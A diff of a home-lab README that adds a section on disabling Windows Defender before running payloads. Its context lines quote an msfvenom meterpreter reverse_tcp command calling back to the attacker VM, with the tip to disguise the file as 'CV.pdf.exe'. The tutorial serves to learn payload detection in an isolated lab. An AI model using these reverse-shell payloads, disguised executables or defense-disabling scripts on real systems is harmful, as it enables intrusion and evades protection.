@@ -76,3 +76,9 @@ In the Kali terminal we can use "msfvenom -p windows/x64/meterpreter_reverse_tcp
 LHOST = The IP address of your Kali VM, Notepad.exe is our generated filename which can be any name of your choosing eg CV.pdf.exe.  
 <img width="728" height="232" alt="image" src="https://github.com/user-attachments/assets/803f1157-5acb-4880-9490-5e3e998b0105" />
 
+---
+## Windows Defender
+- In order to use msfvenom payloads on our Windows VM we must disable Windows Defender.
+Using msfvenom without obfuscation of our payload will be easily detected by antivirus software. For the simplicity and learning of payload functions and detections I will not attempt to obfuscate or evade antivirus.   
+On our Windows VM, using the [Disable Windows Defender](https://github.com/Trn44/SOC-Home-Lab/raw/main/Disable Windows Defender.ps1) PowerShell script we can disable all Windows Defender components.  
+Disabling defender when simulating an attack in a closed LAN environment is safe as we are not open to any vulnerabilities which can be used over an open network connection, only our own attacks.  
